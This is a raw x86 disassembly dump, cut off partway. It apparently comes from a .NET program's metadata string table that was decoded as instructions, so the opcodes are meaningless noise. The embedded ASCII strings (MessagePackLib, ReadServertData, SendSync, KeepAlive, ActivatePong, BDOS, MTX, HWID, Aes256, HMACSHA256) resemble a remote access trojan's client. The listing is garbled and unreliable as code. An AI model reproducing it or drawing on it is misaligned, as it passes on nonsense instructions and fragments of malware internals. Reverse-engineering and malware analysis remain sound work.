  40771d:	07                   	pop    %es
  40771e:	00 01                	add    %al,(%ecx)
  407720:	71 00                	jno    0x407722
  407722:	02 1c 01             	add    (%ecx,%eax,1),%bl
  407725:	00 00                	add    %al,(%eax)
  407727:	01 73 00             	add    %esi,0x0(%ebx)
  40772a:	ed                   	in     (%dx),%eax
  40772b:	1b 01                	sbb    (%ecx),%eax
  40772d:	00 00                	add    %al,(%eax)
  40772f:	01 75 00             	add    %esi,0x0(%ebp)
  407732:	ed                   	in     (%dx),%eax
  407733:	05 02 00 41 01       	add    $0x1410002,%eax
  407738:	77 00                	ja     0x40773a
  40773a:	03 1b                	add    (%ebx),%ebx
  40773c:	02 00                	add    (%eax),%al
  40773e:	40                   	inc    %eax
  40773f:	01 79 00             	add    %edi,0x0(%ecx)
  407742:	c1 08 02             	rorl   $0x2,(%eax)
  407745:	00 40 01             	add    %al,0x1(%eax)
  407748:	7b 00                	jnp    0x40774a
  40774a:	80 0e 03             	orb    $0x3,(%esi)
  40774d:	00 50 20             	add    %dl,0x20(%eax)
  407750:	00 00                	add    %al,(%eax)
  407752:	2d 00 70 20 00       	sub    $0x207000,%eax
  407757:	00 47 00             	add    %al,0x0(%edi)
  40775a:	04 80                	add    $0x80,%al
  40775c:	00 00                	add    %al,(%eax)
  40775e:	01 00                	add    %eax,(%eax)
	...
  40776c:	01 02                	add    %eax,(%edx)
  40776e:	00 00                	add    %al,(%eax)
  407770:	04 00                	add    $0x0,%al
	...
  40777a:	00 00                	add    %al,(%eax)
  40777c:	01 00                	add    %eax,(%eax)
  40777e:	bf 02 00 00 00       	mov    $0x2,%edi
  407783:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40778e:	00 00                	add    %al,(%eax)
  407790:	01 00                	add    %eax,(%eax)
  407792:	f0 0f 00 00          	lock sldt (%eax)
  407796:	00 00                	add    %al,(%eax)
  407798:	04 00                	add    $0x0,%al
	...
  4077a2:	00 00                	add    %al,(%eax)
  4077a4:	cc                   	int3
  4077a5:	00 d6                	add    %dl,%dh
  4077a7:	0c 00                	or     $0x0,%al
  4077a9:	00 00                	add    %al,(%eax)
  4077ab:	00 04 00             	add    %al,(%eax,%eax,1)
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	00 00                	add    %al,(%eax)
  4077b2:	00 00                	add    %al,(%eax)
  4077b4:	70 00                	jo     0x4077b6
  4077b6:	00 00                	add    %al,(%eax)
  4077b8:	01 00                	add    %eax,(%eax)
  4077ba:	49                   	dec    %ecx
  4077bb:	08 00                	or     %al,(%eax)
  4077bd:	00 00                	add    %al,(%eax)
  4077bf:	00 0a                	add    %cl,(%edx)
	...
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 cc                	add    %cl,%ah
  4077cd:	00 e3                	add    %ah,%bl
  4077cf:	02 00                	add    (%eax),%al
  4077d1:	00 00                	add    %al,(%eax)
  4077d3:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077de:	00 00                	add    %al,(%eax)
  4077e0:	cc                   	int3
  4077e1:	00 81 1a 00 00 00    	add    %al,0x1a(%ecx)
  4077e7:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	01 00                	add    %eax,(%eax)
  4077f6:	a8 17                	test   $0x17,%al
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	04 00                	add    $0x0,%al
  4077fe:	00 00                	add    %al,(%eax)
  407800:	00 00                	add    %al,(%eax)
  407802:	00 00                	add    %al,(%eax)
  407804:	70 00                	jo     0x407806
  407806:	00 00                	add    %al,(%eax)
  407808:	cc                   	int3
  407809:	00 97 12 00 00 00    	add    %dl,0x12(%edi)
  40780f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407812:	0b 00                	or     (%eax),%eax
  407814:	10 00                	adc    %al,(%eax)
  407816:	0f 00 14 00          	lldt   (%eax,%eax,1)
  40781a:	13 00                	adc    (%eax),%eax
  40781c:	1e                   	push   %ds
  40781d:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  407823:	06                   	push   %es
  407824:	00 41 63             	add    %al,0x63(%ecx)
  407827:	74 69                	je     0x407892
  407829:	6f                   	outsl  %ds:(%esi),(%dx)
  40782a:	6e                   	outsb  %ds:(%esi),(%dx)
  40782b:	60                   	pusha
  40782c:	31 30                	xor    %esi,(%eax)
  40782e:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407831:	70 5f                	jo     0x407892
  407833:	5f                   	pop    %edi
  407834:	30 00                	xor    %al,(%eax)
  407836:	49                   	dec    %ecx
  407837:	45                   	inc    %ebp
  407838:	6e                   	outsb  %ds:(%esi),(%dx)
  407839:	75 6d                	jne    0x4078a8
  40783b:	65 72 61             	gs jb  0x40789f
  40783e:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407842:	31 00                	xor    %eax,(%eax)
  407844:	43                   	inc    %ebx
  407845:	61                   	popa
  407846:	6c                   	insb   (%dx),%es:(%edi)
  407847:	6c                   	insb   (%dx),%es:(%edi)
  407848:	53                   	push   %ebx
  407849:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407850:	69 
  407851:	73 74                	jae    0x4078c7
  407853:	60                   	pusha
  407854:	31 00                	xor    %eax,(%eax)
  407856:	61                   	popa
  407857:	31 00                	xor    %eax,(%eax)
  407859:	76 31                	jbe    0x40788c
  40785b:	00 5f 5f             	add    %bl,0x5f(%edi)
  40785e:	53                   	push   %ebx
  40785f:	74 61                	je     0x4078c2
  407861:	74 69                	je     0x4078cc
  407863:	63 41 72             	arpl   %eax,0x72(%ecx)
  407866:	72 61                	jb     0x4078c9
  407868:	79 49                	jns    0x4078b3
  40786a:	6e                   	outsb  %ds:(%esi),(%dx)
  40786b:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  407872:	69 
  407873:	7a 65                	jp     0x4078da
  407875:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  40787a:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407881:	74 2e                	je     0x4078b1
  407883:	57                   	push   %edi
  407884:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  40788b:	55                   	push   %ebp
  40788c:	49                   	dec    %ecx
  40788d:	6e                   	outsb  %ds:(%esi),(%dx)
  40788e:	74 33                	je     0x4078c3
  407890:	32 00                	xor    (%eax),%al
  407892:	54                   	push   %esp
  407893:	6f                   	outsl  %ds:(%esi),(%dx)
  407894:	49                   	dec    %ecx
  407895:	6e                   	outsb  %ds:(%esi),(%dx)
  407896:	74 33                	je     0x4078cb
  407898:	32 00                	xor    (%eax),%al
  40789a:	53                   	push   %ebx
  40789b:	77 61                	ja     0x4078fe
  40789d:	70 49                	jo     0x4078e8
  40789f:	6e                   	outsb  %ds:(%esi),(%dx)
  4078a0:	74 33                	je     0x4078d5
  4078a2:	32 00                	xor    (%eax),%al
  4078a4:	3c 3e                	cmp    $0x3e,%al
  4078a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4078a7:	5f                   	pop    %edi
  4078a8:	5f                   	pop    %edi
  4078a9:	32 00                	xor    (%eax),%al
  4078ab:	61                   	popa
  4078ac:	32 00                	xor    (%eax),%al
  4078ae:	58                   	pop    %eax
  4078af:	35 30 39 43 65       	xor    $0x65433930,%eax
  4078b4:	72 74                	jb     0x40792a
  4078b6:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4078bd:	32 00                	xor    (%eax),%al
  4078bf:	76 32                	jbe    0x4078f3
  4078c1:	00 76 33             	add    %dh,0x33(%esi)
  4078c4:	00 57 72             	add    %dl,0x72(%edi)
  4078c7:	69 74 65 55 49 6e 74 	imul   $0x36746e49,0x55(%ebp,%eiz,2),%esi
  4078ce:	36 
  4078cf:	34 00                	xor    $0x0,%al
  4078d1:	54                   	push   %esp
  4078d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4078d3:	55                   	push   %ebp
  4078d4:	49                   	dec    %ecx
  4078d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4078d6:	74 36                	je     0x40790e
  4078d8:	34 00                	xor    $0x0,%al
  4078da:	47                   	inc    %edi
  4078db:	65 74 41             	gs je  0x40791f
  4078de:	73 55                	jae    0x407935
  4078e0:	49                   	dec    %ecx
  4078e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e2:	74 36                	je     0x40791a
  4078e4:	34 00                	xor    $0x0,%al
  4078e6:	53                   	push   %ebx
  4078e7:	65 74 41             	gs je  0x40792b
  4078ea:	73 55                	jae    0x407941
  4078ec:	49                   	dec    %ecx
  4078ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ee:	74 36                	je     0x407926
  4078f0:	34 00                	xor    $0x0,%al
  4078f2:	54                   	push   %esp
  4078f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4078f4:	49                   	dec    %ecx
  4078f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f6:	74 36                	je     0x40792e
  4078f8:	34 00                	xor    $0x0,%al
  4078fa:	53                   	push   %ebx
  4078fb:	77 61                	ja     0x40795e
  4078fd:	70 49                	jo     0x407948
  4078ff:	6e                   	outsb  %ds:(%esi),(%dx)
  407900:	74 36                	je     0x407938
  407902:	34 00                	xor    $0x0,%al
  407904:	54                   	push   %esp
  407905:	6f                   	outsl  %ds:(%esi),(%dx)
  407906:	55                   	push   %ebp
  407907:	49                   	dec    %ecx
  407908:	6e                   	outsb  %ds:(%esi),(%dx)
  407909:	74 31                	je     0x40793c
  40790b:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  407910:	6e                   	outsb  %ds:(%esi),(%dx)
  407911:	74 31                	je     0x407944
  407913:	36 00 53 77          	add    %dl,%ss:0x77(%ebx)
  407917:	61                   	popa
  407918:	70 49                	jo     0x407963
  40791a:	6e                   	outsb  %ds:(%esi),(%dx)
  40791b:	74 31                	je     0x40794e
  40791d:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  407921:	41                   	inc    %ecx
  407922:	43                   	inc    %ebx
  407923:	53                   	push   %ebx
  407924:	48                   	dec    %eax
  407925:	41                   	inc    %ecx
  407926:	32 35 36 00 53 68    	xor    0x68530036,%dh
  40792c:	61                   	popa
  40792d:	32 35 36 00 41 65    	xor    0x65410036,%dh
  407933:	73 32                	jae    0x407967
  407935:	35 36 00 61 65       	xor    $0x65610036,%eax
  40793a:	73 32                	jae    0x40796e
  40793c:	35 36 00 5f 5f       	xor    $0x5f5f0036,%eax
  407941:	53                   	push   %ebx
  407942:	74 61                	je     0x4079a5
  407944:	74 69                	je     0x4079af
  407946:	63 41 72             	arpl   %eax,0x72(%ecx)
  407949:	72 61                	jb     0x4079ac
  40794b:	79 49                	jns    0x407996
  40794d:	6e                   	outsb  %ds:(%esi),(%dx)
  40794e:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  407955:	69 
  407956:	7a 65                	jp     0x4079bd
  407958:	3d 36 00 67 65       	cmp    $0x65670036,%eax
  40795d:	74 5f                	je     0x4079be
  40795f:	55                   	push   %ebp
  407960:	54                   	push   %esp
  407961:	46                   	inc    %esi
  407962:	38 00                	cmp    %al,(%eax)
  407964:	3c 4d                	cmp    $0x4d,%al
  407966:	6f                   	outsl  %ds:(%esi),(%dx)
  407967:	64 75 6c             	fs jne 0x4079d6
  40796a:	65 3e 00 4d 65       	gs add %cl,%ds:0x65(%ebp)
  40796f:	73 73                	jae    0x4079e4
  407971:	61                   	popa
  407972:	67 65 50             	addr16 gs push %eax
  407975:	61                   	popa
  407976:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  407979:	69 62 2e 3c 50 72 69 	imul   $0x6972503c,0x2e(%edx),%esp
  407980:	76 61                	jbe    0x4079e3
  407982:	74 65                	je     0x4079e9
  407984:	49                   	dec    %ecx
  407985:	6d                   	insl   (%dx),%es:(%edi)
  407986:	70 6c                	jo     0x4079f4
  407988:	65 6d                	gs insl (%dx),%es:(%edi)
  40798a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40798c:	74 61                	je     0x4079ef
  40798e:	74 69                	je     0x4079f9
  407990:	6f                   	outsl  %ds:(%esi),(%dx)
  407991:	6e                   	outsb  %ds:(%esi),(%dx)
  407992:	44                   	inc    %esp
  407993:	65 74 61             	gs je  0x4079f7
  407996:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  40799d:	42 
  40799e:	32 41 31             	xor    0x31(%ecx),%al
  4079a1:	46                   	inc    %esi
  4079a2:	39 39                	cmp    %edi,(%ecx)
  4079a4:	30 32                	xor    %dh,(%edx)
  4079a6:	42                   	inc    %edx
  4079a7:	33 35 46 38 46 38    	xor    0x38463846,%esi
  4079ad:	38 30                	cmp    %dh,(%eax)
  4079af:	45                   	inc    %ebp
  4079b0:	46                   	inc    %esi
  4079b1:	31 36                	xor    %esi,(%esi)
  4079b3:	39 32                	cmp    %esi,(%edx)
  4079b5:	43                   	inc    %ebx
  4079b6:	45                   	inc    %ebp
  4079b7:	39 39                	cmp    %edi,(%ecx)
  4079b9:	34 37                	xor    $0x37,%al
  4079bb:	41                   	inc    %ecx
  4079bc:	31 39                	xor    %edi,(%ecx)
  4079be:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  4079c2:	36 39 38             	cmp    %edi,%ss:(%eax)
  4079c5:	44                   	inc    %esp
  4079c6:	38 46 35             	cmp    %al,0x35(%esi)
  4079c9:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  4079cd:	41                   	inc    %ecx
  4079ce:	37                   	aaa
  4079cf:	32 31                	xor    (%ecx),%dh
  4079d1:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  4079d7:	43                   	inc    %ebx
  4079d8:	35 38 42 00 47       	xor    $0x47004238,%eax
  4079dd:	43                   	inc    %ebx
  4079de:	00 45 53             	add    %al,0x53(%ebp)
  4079e1:	5f                   	pop    %edi
  4079e2:	53                   	push   %ebx
  4079e3:	59                   	pop    %ecx
  4079e4:	53                   	push   %ebx
  4079e5:	54                   	push   %esp
  4079e6:	45                   	inc    %ebp
  4079e7:	4d                   	dec    %ebp
  4079e8:	5f                   	pop    %edi
  4079e9:	52                   	push   %edx
  4079ea:	45                   	inc    %ebp
  4079eb:	51                   	push   %ecx
  4079ec:	55                   	push   %ebp
  4079ed:	49                   	dec    %ecx
  4079ee:	52                   	push   %edx
  4079ef:	45                   	inc    %ebp
  4079f0:	44                   	inc    %esp
  4079f1:	00 45 53             	add    %al,0x53(%ebp)
  4079f4:	5f                   	pop    %edi
  4079f5:	44                   	inc    %esp
  4079f6:	49                   	dec    %ecx
  4079f7:	53                   	push   %ebx
  4079f8:	50                   	push   %eax
  4079f9:	4c                   	dec    %esp
  4079fa:	41                   	inc    %ecx
  4079fb:	59                   	pop    %ecx
  4079fc:	5f                   	pop    %edi
  4079fd:	52                   	push   %edx
  4079fe:	45                   	inc    %ebp
  4079ff:	51                   	push   %ecx
  407a00:	55                   	push   %ebp
  407a01:	49                   	dec    %ecx
  407a02:	52                   	push   %edx
  407a03:	45                   	inc    %ebp
  407a04:	44                   	inc    %esp
  407a05:	00 4d 61             	add    %cl,0x61(%ebp)
  407a08:	70 4e                	jo     0x407a58
  407a0a:	61                   	popa
  407a0b:	6d                   	insl   (%dx),%es:(%edi)
  407a0c:	65 54                	gs push %esp
  407a0e:	6f                   	outsl  %ds:(%esi),(%dx)
  407a0f:	4f                   	dec    %edi
  407a10:	49                   	dec    %ecx
  407a11:	44                   	inc    %esp
  407a12:	00 48 57             	add    %cl,0x57(%eax)
  407a15:	49                   	dec    %ecx
  407a16:	44                   	inc    %esp
  407a17:	00 67 65             	add    %ah,0x65(%edi)
  407a1a:	74 5f                	je     0x407a7b
  407a1c:	46                   	inc    %esi
  407a1d:	6f                   	outsl  %ds:(%esi),(%dx)
  407a1e:	72 6d                	jb     0x407a8d
  407a20:	61                   	popa
  407a21:	74 49                	je     0x407a6c
  407a23:	44                   	inc    %esp
  407a24:	00 57 69             	add    %dl,0x69(%edi)
  407a27:	6e                   	outsb  %ds:(%esi),(%dx)
  407a28:	41                   	inc    %ecx
  407a29:	53                   	push   %ebx
  407a2a:	44                   	inc    %esp
  407a2b:	00 45 58             	add    %al,0x58(%ebp)
  407a2e:	45                   	inc    %ebp
  407a2f:	43                   	inc    %ebx
  407a30:	55                   	push   %ebp
  407a31:	54                   	push   %esp
  407a32:	49                   	dec    %ecx
  407a33:	4f                   	dec    %edi
  407a34:	4e                   	dec    %esi
  407a35:	5f                   	pop    %edi
  407a36:	53                   	push   %ebx
  407a37:	54                   	push   %esp
  407a38:	41                   	inc    %ecx
  407a39:	54                   	push   %esp
  407a3a:	45                   	inc    %ebp
  407a3b:	00 38                	add    %bh,(%eax)
  407a3d:	37                   	aaa
  407a3e:	36 33 39             	xor    %ss:(%ecx),%edi
  407a41:	31 32                	xor    %esi,(%edx)
  407a43:	36 45                	ss inc %ebp
  407a45:	41                   	inc    %ecx
  407a46:	37                   	aaa
  407a47:	37                   	aaa
  407a48:	42                   	inc    %edx
  407a49:	33 35 38 46 32 36    	xor    0x36324638,%esi
  407a4f:	35 33 32 33 36       	xor    $0x36333233,%eax
  407a54:	37                   	aaa
  407a55:	44                   	inc    %esp
  407a56:	42                   	inc    %edx
  407a57:	41                   	inc    %ecx
  407a58:	36 37                	ss aaa
  407a5a:	43                   	inc    %ebx
  407a5b:	35 33 31 30 45       	xor    $0x45303133,%eax
  407a60:	46                   	inc    %esi
  407a61:	35 30 41 38 44       	xor    $0x44384130,%eax
  407a66:	39 38                	cmp    %edi,(%eax)
  407a68:	38 38                	cmp    %bh,(%eax)
  407a6a:	45                   	inc    %ebp
  407a6b:	44                   	inc    %esp
  407a6c:	30 37                	xor    %dh,(%edi)
  407a6e:	30 43 44             	xor    %al,0x44(%ebx)
  407a71:	34 30                	xor    $0x30,%al
  407a73:	45                   	inc    %ebp
  407a74:	31 46 36             	xor    %eax,0x36(%esi)
  407a77:	30 35 41 38 46 00    	xor    %dh,0x463841
  407a7d:	67 65 74 5f          	addr16 gs je 0x407ae0
  407a81:	41                   	inc    %ecx
  407a82:	53                   	push   %ebx
  407a83:	43                   	inc    %ebx
  407a84:	49                   	dec    %ecx
  407a85:	49                   	dec    %ecx
  407a86:	00 53 79             	add    %dl,0x79(%ebx)
  407a89:	73 74                	jae    0x407aff
  407a8b:	65 6d                	gs insl (%dx),%es:(%edi)
  407a8d:	2e 49                	cs dec %ecx
  407a8f:	4f                   	dec    %edi
  407a90:	00 49 73             	add    %cl,0x73(%ecx)
  407a93:	58                   	pop    %eax
  407a94:	50                   	push   %eax
  407a95:	00 42 44             	add    %al,0x44(%edx)
  407a98:	4f                   	dec    %edi
  407a99:	53                   	push   %ebx
  407a9a:	00 45 53             	add    %al,0x53(%ebp)
  407a9d:	5f                   	pop    %edi
  407a9e:	43                   	inc    %ebx
  407a9f:	4f                   	dec    %edi
  407aa0:	4e                   	dec    %esi
  407aa1:	54                   	push   %esp
  407aa2:	49                   	dec    %ecx
  407aa3:	4e                   	dec    %esi
  407aa4:	55                   	push   %ebp
  407aa5:	4f                   	dec    %edi
  407aa6:	55                   	push   %ebp
  407aa7:	53                   	push   %ebx
  407aa8:	00 67 65             	add    %ah,0x65(%edi)
  407aab:	74 5f                	je     0x407b0c
  407aad:	49                   	dec    %ecx
  407aae:	56                   	push   %esi
  407aaf:	00 73 65             	add    %dh,0x65(%ebx)
  407ab2:	74 5f                	je     0x407b13
  407ab4:	49                   	dec    %ecx
  407ab5:	56                   	push   %esi
  407ab6:	00 47 65             	add    %al,0x65(%edi)
  407ab9:	6e                   	outsb  %ds:(%esi),(%dx)
  407aba:	65 72 61             	gs jb  0x407b1e
  407abd:	74 65                	je     0x407b24
  407abf:	49                   	dec    %ecx
  407ac0:	56                   	push   %esi
  407ac1:	00 4d 54             	add    %cl,0x54(%ebp)
  407ac4:	58                   	pop    %eax
  407ac5:	00 76 61             	add    %dh,0x61(%esi)
  407ac8:	6c                   	insb   (%dx),%es:(%edi)
  407ac9:	75 65                	jne    0x407b30
  407acb:	5f                   	pop    %edi
  407acc:	5f                   	pop    %edi
  407acd:	00 52 65             	add    %dl,0x65(%edx)
  407ad0:	61                   	popa
  407ad1:	64 53                	fs push %ebx
  407ad3:	65 72 76             	gs jb  0x407b4c
  407ad6:	65 72 74             	gs jb  0x407b4d
  407ad9:	44                   	inc    %esp
  407ada:	61                   	popa
  407adb:	74 61                	je     0x407b3e
  407add:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  407ae1:	61                   	popa
  407ae2:	00 6d 73             	add    %ch,0x73(%ebp)
  407ae5:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407ae8:	6c                   	insb   (%dx),%es:(%edi)
  407ae9:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  407af0:	65 6d                	gs insl (%dx),%es:(%edi)
  407af2:	2e 43                	cs inc %ebx
  407af4:	6f                   	outsl  %ds:(%esi),(%dx)
  407af5:	6c                   	insb   (%dx),%es:(%edi)
  407af6:	6c                   	insb   (%dx),%es:(%edi)
  407af7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407afc:	6e                   	outsb  %ds:(%esi),(%dx)
  407afd:	73 2e                	jae    0x407b2d
  407aff:	47                   	inc    %edi
  407b00:	65 6e                	outsb  %gs:(%esi),(%dx)
  407b02:	65 72 69             	gs jb  0x407b6e
  407b05:	63 00                	arpl   %eax,(%eax)
  407b07:	4d                   	dec    %ebp
  407b08:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407b0f:	74 2e                	je     0x407b3f
  407b11:	56                   	push   %esi
  407b12:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407b19:	73 69                	jae    0x407b84
  407b1b:	63 00                	arpl   %eax,(%eax)
  407b1d:	67 65 74 5f          	addr16 gs je 0x407b80
  407b21:	53                   	push   %ebx
  407b22:	65 6e                	outsb  %gs:(%esi),(%dx)
  407b24:	64 53                	fs push %ebx
  407b26:	79 6e                	jns    0x407b96
  407b28:	63 00                	arpl   %eax,(%eax)
  407b2a:	45                   	inc    %ebp
  407b2b:	6e                   	outsb  %ds:(%esi),(%dx)
  407b2c:	64 52                	fs push %edx
  407b2e:	65 61                	gs popa
  407b30:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  407b34:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  407b3b:	00 
  407b3c:	54                   	push   %esp
  407b3d:	68 72 65 61 64       	push   $0x64616572
  407b42:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  407b46:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  407b4a:	6e                   	outsb  %ds:(%esi),(%dx)
  407b4b:	65 72 41             	gs jb  0x407b8f
  407b4e:	64 64 00 53 48       	fs add %dl,%fs:0x48(%ebx)
  407b53:	41                   	inc    %ecx
  407b54:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  407b5a:	61                   	popa
  407b5b:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  407b61:	74 5f                	je     0x407bc2
  407b63:	43                   	inc    %ebx
  407b64:	6f                   	outsl  %ds:(%esi),(%dx)
  407b65:	6e                   	outsb  %ds:(%esi),(%dx)
  407b66:	6e                   	outsb  %ds:(%esi),(%dx)
  407b67:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b6c:	00 67 65             	add    %ah,0x65(%edi)
  407b6f:	74 5f                	je     0x407bd0
  407b71:	49                   	dec    %ecx
  407b72:	73 43                	jae    0x407bb7
  407b74:	6f                   	outsl  %ds:(%esi),(%dx)
  407b75:	6e                   	outsb  %ds:(%esi),(%dx)
  407b76:	6e                   	outsb  %ds:(%esi),(%dx)
  407b77:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b7c:	00 73 65             	add    %dh,0x65(%ebx)
  407b7f:	74 5f                	je     0x407be0
  407b81:	49                   	dec    %ecx
  407b82:	73 43                	jae    0x407bc7
  407b84:	6f                   	outsl  %ds:(%esi),(%dx)
  407b85:	6e                   	outsb  %ds:(%esi),(%dx)
  407b86:	6e                   	outsb  %ds:(%esi),(%dx)
  407b87:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b8c:	00 52 65             	add    %dl,0x65(%edx)
  407b8f:	63 65 69             	arpl   %esp,0x69(%ebp)
  407b92:	76 65                	jbe    0x407bf9
  407b94:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407b98:	74 5f                	je     0x407bf9
  407b9a:	47                   	inc    %edi
  407b9b:	75 69                	jne    0x407c06
  407b9d:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  407ba1:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  407ba8:	64 
  407ba9:	53                   	push   %ebx
  407baa:	79 6e                	jns    0x407c1a
  407bac:	63 3e                	arpl   %edi,(%esi)
  407bae:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407bb2:	61                   	popa
  407bb3:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bb6:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb7:	67 46                	addr16 inc %esi
  407bb9:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407bc0:	73 43                	jae    0x407c05
  407bc2:	6f                   	outsl  %ds:(%esi),(%dx)
  407bc3:	6e                   	outsb  %ds:(%esi),(%dx)
  407bc4:	6e                   	outsb  %ds:(%esi),(%dx)
  407bc5:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407bca:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407bcf:	61                   	popa
  407bd0:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bd3:	6e                   	outsb  %ds:(%esi),(%dx)
  407bd4:	67 46                	addr16 inc %esi
  407bd6:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  407bdd:	65 65 70 41          	gs gs jo 0x407c22
  407be1:	6c                   	insb   (%dx),%es:(%edi)
  407be2:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  407be9:	42                   	inc    %edx
  407bea:	61                   	popa
  407beb:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bee:	6e                   	outsb  %ds:(%esi),(%dx)
  407bef:	67 46                	addr16 inc %esi
  407bf1:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  407bf8:	65 61                	gs popa
  407bfa:	64 65 72 53          	fs gs jb 0x407c51
  407bfe:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  407c05:	42                   	inc    %edx
  407c06:	61                   	popa
  407c07:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c0a:	6e                   	outsb  %ds:(%esi),(%dx)
  407c0b:	67 46                	addr16 inc %esi
  407c0d:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  407c14:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  407c1b:	42                   	inc    %edx
  407c1c:	61                   	popa
  407c1d:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c20:	6e                   	outsb  %ds:(%esi),(%dx)
  407c21:	67 46                	addr16 inc %esi
  407c23:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  407c2a:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407c2e:	61                   	popa
  407c2f:	74 65                	je     0x407c96
  407c31:	50                   	push   %eax
  407c32:	6f                   	outsl  %ds:(%esi),(%dx)
  407c33:	6e                   	outsb  %ds:(%esi),(%dx)
  407c34:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  407c3a:	61                   	popa
  407c3b:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c3e:	6e                   	outsb  %ds:(%esi),(%dx)
  407c3f:	67 46                	addr16 inc %esi
  407c41:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407c48:	6e                   	outsb  %ds:(%esi),(%dx)
  407c49:	74 65                	je     0x407cb0
  407c4b:	72 76                	jb     0x407cc3
  407c4d:	61                   	popa
  407c4e:	6c                   	insb   (%dx),%es:(%edi)
  407c4f:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407c54:	61                   	popa
  407c55:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c58:	6e                   	outsb  %ds:(%esi),(%dx)
  407c59:	67 46                	addr16 inc %esi
  407c5b:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  407c62:	75 66                	jne    0x407cca
  407c64:	66 65 72 3e          	data16 gs jb 0x407ca6
  407c68:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c6c:	61                   	popa
  407c6d:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c70:	6e                   	outsb  %ds:(%esi),(%dx)
  407c71:	67 46                	addr16 inc %esi
  407c73:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  407c7a:	66 66 73 65          	data16 data16 jae 0x407ce3
